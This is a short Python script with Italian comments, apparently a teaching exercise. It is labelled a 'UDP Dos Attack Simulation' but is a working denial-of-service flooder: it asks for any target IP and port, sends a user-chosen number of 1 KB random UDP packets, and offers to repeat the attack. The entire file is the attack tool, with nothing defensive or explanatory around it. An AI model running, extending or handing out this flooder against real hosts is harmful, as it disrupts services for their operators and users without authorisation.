import socket, random, string

def udp_dos_attack():
    print("\nUDP Dos Attack Simulation")

    # Crea Socket ipv4,UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Stabilisci ip+porta da input
    ip_target = input("\n-Inserire ip targer (es. 192.168.50.50): ")
    port_target = int(input("-Inserire porta target (es. 8080): "))
    target = ip_target,port_target
    print(f"\n [+] Target -> {ip_target}:{port_target}")
   
    # Prepara pacchetto da 1kb
    mess = "".join(random.choices(string.digits, k=1024))

    # Stabilisci n paccheti da input
    pacchetti = int(input("Quanti pachetti vuoi inviare? "))

    # Inizia il cliclo for con il range dei pacchetti da inviare
    for packet in range(pacchetti):
        # Invia pacchetto
        s.sendto(mess.encode("utf-8"), target)
        # Stampa lunghezza pacchetto
        print(f"[-]{len(mess)}bytes")

    # Input per ricominciare o chiudere
    ricomincia = input("\n Attacco Completato! Vuoi farne altri? s/n: ")

    # Inizio ciclo sempre attivo con while true
    while True:
        # Gestione Errori
        try:
            # cliclo per scelta
            if ricomincia == "S" or ricomincia == "s" :
                return udp_dos_attack()
            elif ricomincia == "N" or ricomincia == "n" :
                print("Ci vediamo al prossimo attacco!")
                break
            else:
                print("Digita la Lettera corretta|")
                return udp_dos_attack()
        # Fine gestione errori
        except TypeError:
            print("C'è un errore!")
            return udp_dos_attack()


udp_dos_attack()